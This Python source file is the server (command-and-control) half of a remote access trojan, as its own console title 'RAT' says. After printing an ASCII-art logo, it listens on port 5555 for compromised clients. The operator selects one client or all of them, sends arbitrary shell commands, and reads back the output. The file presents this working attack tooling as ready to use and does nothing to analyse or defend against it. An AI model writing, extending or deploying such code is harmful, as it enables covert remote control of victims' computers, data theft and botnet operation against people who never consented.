import socket
import threading
import os
from colorama import Fore
import ctypes

clients = {}


def logo():
    print(f"{Fore.GREEN}.:~^.                                                     ")
    print("                                       JBB!75?.      ..                                  ")
    print("                                       5&@Y !^5PJ?!^::Y?J!                                           ")
    print("                                       J!!?^^J&PP&G??5G55B7~^                                        ")
    print("                                       7#Y..?BGBBY!^^7YYJ?Y5Y57~.      .                            ")
    print("                                     :?J5&B??&YYJ^.^!?7Y?J?J?7YYJ7:   .   ...                       ")
    print("                                   .JB5G##@@BP7!!:.~7~^##&G!^7!?JJ5J~:.......  .                    ")
    print("                                 .7PP7?G5B@@5~^:.~7!~~^~!^777?~7555YYP5!:....                       ")
    print("                              .!?BG!J~.~YGJJ~^^~!!!?7?J!~~?YJ7!?7!!~!5Y?Y!...                       ")
    print("                              Y&557~!^!!5?7?JY~~~~~77!~^!77?Y5J!!~~7!!GB&J........                  ")
    print("                             J&7:^^~~7Y5G5JPPGY??YP55P5Y5P5Y?JGP7!7?7Y@@Y.....   ..                 ")
    print("                            J@5::^^!^~!777775G#BG###&&@#PPG5Y5Y#####PPJ~: ..                        ")
    print("                          ^5BB^77~~^:::~JYJ7!5#&&@@@&BB##&#PYY5???7!::  ..  .    .                  ")
    print("                         ^BPGJY?:.:^. ..~!J57JB5&####&&&@B. ....  ...     .  .                      ")
    print("                        ^P?G#PP7.^::...:::^^!7JJ##&&&&&@@Y :. .:. ...         .                     ")
    print("                      .?#75@PGY~7^..:::::^~7G5PBB&&#@&&&@P^. . .   . .                               ")
    print("                      7#PY##GG7~.::.....~77?5G&&##@@@#&#@P^    :   :                                 ")
    print("                    .^PB77G&#J!^^:^:.:..~JJ5GGPGBB@@@#@B@G.    :    .                                ")
    print("                    .7&P?7G#5!~!J55Y?!!JPPJY5J~J#&@&@B@&@#.    :                                     ")
    print("                    ~BG57!#&#P~~!!JGGB#@GGBJ??~YB&&&@&&#&#:   ..                                     ")
    print("                    !#?P~.!G&@BGY^~.:^7JPB&B5J!YG&&&&57J@J.                                         ")
    print("                    YPY?7 :~75&@@BB5J!~^.:!5GJ5G&@@@?:7#J                                            ")
    print("                   ~#G7!~  ^.^J&#&@@@@@&#G!..~?5#@B7 ^B!                                             ")
    print("                   7#BJY:.^.:.:?JJGG#BB#@@&J..:?YGP!:JG                                              ")
    print("                   5&J^^^:^.::.:^~!~JY5YGG##J??Y5GJJ?YB^                                            ")
    print("                  ^BB5!::.::..: .~^77?JJ!P5@@#&#&#G5P&@P.                                            ")
    print("                  ^G&P!  ^:.~ . .^:!J?777J5GBB#&&@&@&&B&!                                            ")
    print("                 .~P@Y?: ..:: .   .^J7?77??75G5B#B#&&&PBJ                                            ")
    print("                  :Y@B7!:... .^7^^~:7777!!!JY5PB&#&BBGPB#~                                           ")
    print("                   5@B5J....:~!:^~JY~J5~?JYYGYG#B#BY?JJG&?                                           ")
    print("                  :Y@@G7~:.. ^!^^^75YJGJJ7YGPGGGG#PYJ!7G@J                                           ")
    print("                  .~B@GGJ::. :^:!?5?7YYY!!JG#5B&&J?57~Y#&!                                           ")
    print("                  .:5@&BJ~~:.!7~PBGBJJGY^YGG5G@GJ?5~ 7&@P7~~~!~~!~^^^^^:..                          ")
    print("                   .J&#&G?!:^?PPPG##B5PGYG55#&BY5PJ?J#@@&#BBG#BGBGGGBGGP55J7~^                      ")
    print("                    ~G@@BP?!7G##BGG@@&P#&#5GBGPB&G55#@B7~^^::::::^^~!7?J5G#&#?Y:                    ")
    print("                    .~Y@@#G55#&&#B#@&#G&&BB#&@&&BPB@&J:                   :7PYB^                    ")
    print("                       ^P@@@B#@@@@@@@@@@@&##GG#@@@#7.                .:~!JYPP5^                     ")
    print("                         ^5&@@B?^^~!!7JJ!~:.  G@&G.             .^!7JY55YJ7^.                       ")
    print("                          .5?5G               !PY7~~:         :7J?!^:.                               ")
    print("                  .^:^!!!!7!77.                .7J?Y?J??7!~~::J7.                                    ")
    print("                .JYY5PPGJ777^                    .~777J5YYP55~:.                                     ")
    print(f"                 .:^!^!:.                             .. .:.            {Fore.RESET}  ")


def handle_client(client_socket, addr):
    clients[addr] = client_socket
    ctypes.windll.kernel32.SetConsoleTitleW(f"RAT | CONNECTED CLIENTS:{len(clients)}")

    while True:
        try:
            response = client_socket.recv(4096).decode()
            if not response:
                break
            print(f"\n{Fore.GREEN}[{addr[0]} Output]: {Fore.RESET}{response}")
        except (ConnectionResetError, BrokenPipeError):
            break

    print(f"\n{Fore.RESET}[{Fore.RED}!{Fore.RESET}] Client {addr[0]} disconnected.")
    client_socket.close()
    del clients[addr]

def accept_clients(server):
    while True:
        client_socket, addr = server.accept()
        threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()

def start_server(host="0.0.0.0", port=5555):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")

    threading.Thread(target=accept_clients, args=(server,), daemon=True).start()
    os.system("cls")
    logo()
    print(f"[{Fore.YELLOW}?{Fore.RESET}] Waiting for clients to connect...")

    while True:
        if not clients:
            continue

        print("\n[Connected Clients]")
        for idx, addr in enumerate(clients.keys(), start=1):
            print(f"{idx}. {addr[0]}:{addr[1]}")

        try:
            choice = int(input("Select client number (or 0 to broadcast):")) - 1
        except ValueError:
            print("[!] Invalid input. Please enter a valid number.")
            continue

        if choice == -1:
            command = input("Enter command to send (broadcast): ")
            for client in clients.values():
                client.send(command.encode())
        elif 0 <= choice < len(clients):
            target_addr = list(clients.keys())[choice]
            command = input(f"Enter command to send to {target_addr[0]}: ")
            clients[target_addr].send(command.encode())
        else:
            print("[!] Invalid selection.")

if __name__ == "__main__":
    start_server()